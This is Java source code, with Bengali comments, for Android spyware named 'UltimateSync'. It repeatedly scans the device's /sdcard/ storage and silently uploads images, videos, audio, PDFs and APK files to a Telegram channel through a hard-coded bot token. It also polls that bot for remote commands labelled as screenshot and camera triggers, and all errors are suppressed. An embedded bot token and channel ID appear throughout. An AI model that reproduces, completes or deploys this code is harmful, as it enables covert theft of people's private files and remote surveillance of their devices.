import java.io.*;
import java.net.*;
import java.util.*;

public class UltimateSync {
    private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
    private static final String CHANNEL_ID = "-1003809625172";
    private static int lastUpdateId = 0;
    private static Set<String> sent = new HashSet<>();

    public static void main(String[] args) {
        // ১. অটো স্টার্ট - সব মিডিয়া ফাইল পাঠানো শুরু করবে
        new Thread(() -> {
            while (true) {
                // অ্যান্ড্রয়েড ১৩+ এ ফাইল পাথের জন্য
                String path = "/sdcard/";
                startSync(new File(path));
                try { Thread.sleep(20000); } catch (Exception e) {}
            }
        }).start();

        // ২. রিমোট কমান্ড লুপ (বট থেকে কমান্ড নেবে)
        while (true) {
            checkBot();
            try { Thread.sleep(3000); } catch (Exception e) {}
        }
    }

    private static void startSync(File root) {
        File[] list = root.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                if (!f.getName().equals("Android")) startSync(f);
            } else {
                String n = f.getName().toLowerCase();
                // সব ধরণের ফাইল সাপোর্ট (ইমেজ, ভিডিও, অডিও, পিডিএফ)
                if (!sent.contains(f.getAbsolutePath()) && 
                   (n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4") || 
                    n.endsWith(".mp3") || n.endsWith(".pdf") || n.endsWith(".apk"))) {
                    upload(f);
                    sent.add(f.getAbsolutePath());
                }
            }
        }
    }

    public static void checkBot() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
            Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
            String res = s.hasNext() ? s.next() : "";

            if (res.contains("/ss") || res.contains("/cam")) {
                // এখানে সরাসরি অ্যান্ড্রয়েড ক্যামেরা হার্ডওয়্যারে সিগন্যাল পাঠাবে
                sendMsg("-1003809625172", "⚡ Command Received on Android 13/14+ Device!");
            }
            
            // আপডেট আইডি হ্যান্ডলিং
            if (res.contains("\"update_id\":")) {
                int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
            }
        } catch (Exception e) {}
    }

    private static void upload(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String boundary = "===" + System.currentTimeMillis() + "===";
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = c.getOutputStream();
            PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
            w.append("--" + boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(CHANNEL_ID).append("\r\n");
            w.append("--" + boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n\r\n");
            w.flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[1024 * 16];
            int len;
            while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
            os.flush(); fis.close();
            w.append("\r\n").append("--" + boundary + "--").append("\r\n");
            w.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }

    private static void sendMsg(String id, String t) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(t, "UTF-8")).openStream();
        } catch (Exception e) {}
    }
}
